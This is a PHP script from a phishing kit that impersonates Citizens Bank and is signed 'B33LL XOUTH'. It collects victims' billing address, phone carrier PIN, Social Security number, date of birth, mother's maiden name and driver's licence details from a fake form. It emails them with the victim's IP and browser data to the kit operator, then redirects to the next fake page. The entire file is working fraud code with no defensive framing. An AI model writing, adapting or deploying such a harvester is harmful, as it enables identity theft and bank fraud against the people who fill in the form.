<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$dir = basename(__DIR__);
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->B33LL XOUTH Citizens Bank - ReZulT (5)<------------------\n";
$message .= "Billing Address: ".$_POST['Address']."\n";
$message .= "City: ".$_POST['City']."\n";
$message .= "State: ".$_POST['State']."\n";
$message .= "Postal: ".$_POST['Postal']."\n";
$message .= "Country: ".$_POST['Country']."\n";
$message .= "Phone Number: ".$_POST['Number']."\n";
$message .= "Carrier Name: ".$_POST['CarrierName']."\n";
$message .= "Carrier PIN: ".$_POST['CarrierPIN']."\n";
$message .= "SSN: ".$_POST['SSN']."\n";
$message .= "Date Of Birth: ".$_POST['DOB']."\n";
$message .= "Mother's Maiden Name: ".$_POST['MMN']."\n";
$message .= "Driving License Number: ".$_POST['DL1']."\n";
$message .= "Driving License Expiry: ".$_POST['DL2']."\n";

$message .= "Time: $timestamp \n";
$message .= "User-Agent: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -BY B33LL XOUTH- ----------\n";

$subject = "Citizens Bank Billing/DL (5)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "B33LL XOUTH ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:billing2.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 